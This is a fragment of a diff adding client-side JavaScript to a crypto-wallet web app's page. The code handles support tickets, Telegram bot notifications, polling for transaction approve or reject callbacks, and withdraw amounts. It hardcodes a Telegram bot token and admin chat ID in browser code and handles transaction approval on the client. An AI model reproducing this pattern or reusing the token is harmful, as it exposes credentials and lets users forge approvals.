+      saveAppData();
+      renderSupportTickets();
+      document.getElementById('support-message').value = '';
+
+      triggerAdminBotNotificationWithSupportKeyboard(
+        `🎫 *SUPPORT TICKET ${ticketBadge}*\n\n👤 ${currentUserProfile.name} (\`${currentUserProfile.username}\`)\n🆔 \`${currentUserProfile.id}\`\n📂 *${category}*\n💬 _${message}_`, 
+        ticketId
+      );
+      showModernAlert({ title: 'Ticket Submitted', message: `Your support ticket ${ticketBadge} has been received.`, type: 'success', icon: 'headphones' });
+    }
+
+    function triggerAdminBotNotificationWithSupportKeyboard(textMessage, ticketId) {
+      const BOT_TOKEN = "9047928965:AAFwgZzenhoygduvmfxCx-FTpoqpq0c2IF8";
+      const ADMIN_CHAT_ID = "7076265514";
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: ADMIN_CHAT_ID, text: textMessage, parse_mode: "Markdown",
+          reply_markup: { inline_keyboard: [[{ text: "💬 Reply to User", callback_data: `reply_tkt_${ticketId}` }]] }
+        })
+      }).catch(err => console.log('Telegram dispatch:', err));
+    }
+
+    let lastUpdateId = parseInt(localStorage.getItem('cryptnexa_last_update_id') || '0');
+    function pollTelegramCallbackQueries() {
+      const BOT_TOKEN = "9047928965:AAFwgZzenhoygduvmfxCx-FTpoqpq0c2IF8";
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=1`)
+        .then(res => res.json())
+        .then(data => {
+          if (data.ok && data.result && data.result.length > 0) {
+            data.result.forEach(update => {
+              lastUpdateId = Math.max(lastUpdateId, update.update_id);
+              localStorage.setItem('cryptnexa_last_update_id', lastUpdateId.toString());
+
+              if (update.callback_query) {
+                const query = update.callback_query;
+                const dataStr = query.data;
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                  method: 'POST', headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ callback_query_id: query.id, text: "Processing..." })
+                }).catch(() => {});
+
+                if (dataStr.startsWith('approve_') || dataStr.startsWith('reject_')) {
+                  const action = dataStr.startsWith('approve_') ? 'approve' : 'reject';
+                  const txId = dataStr.replace('approve_', '').replace('reject_', '');
+                  simulateSystemResponse(txId, action);
+                }
+              }
+            });
+          }
+        })
+        .catch(err => console.log('Poll telegram:', err));
+    }
+
+    function pollServerForSupportReplies() {
+      const stored = localStorage.getItem('cryptnexa_support_' + currentUserProfile.id);
+      if (stored) {
+        try {
+          const parsed = JSON.parse(stored);
+          let updated = false;
+          parsed.forEach(st => {
+            const localMatch = supportTickets.find(lt => lt.id === st.id);
+            if (localMatch && !localMatch.reply && st.reply) {
+              localMatch.reply = st.reply;
+              localMatch.status = st.status;
+              updated = true;
+            }
+          });
+          if (updated) renderSupportTickets();
+        } catch (e) {}
+      }
+    }
+
+    function calculateWithdrawFee() {
+      const amt = parseFloat(document.getElementById('withdraw-amount').value) || 0;
+      document.getElementById('net-receive-text').innerText = `$${amt.toFixed(2)}`;
+    }
+
+    function setMaxWithdraw() {
+      document.getElementById('withdraw-amount').value = userPortfolio.balance;
+      calculateWithdrawFee();
+    }
+
+    function copyToClipboard(elementId) {
+      const text = document.getElementById(elementId).value;
+      navigator.clipboard.writeText(text);
+      if (tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+      showModernAlert({ title: 'Copied to Clipboard', message: 'The information has been successfully copied.', type: 'success', icon: 'copy' });
+    }
+  </script>
+</body>
+                                                 </html>
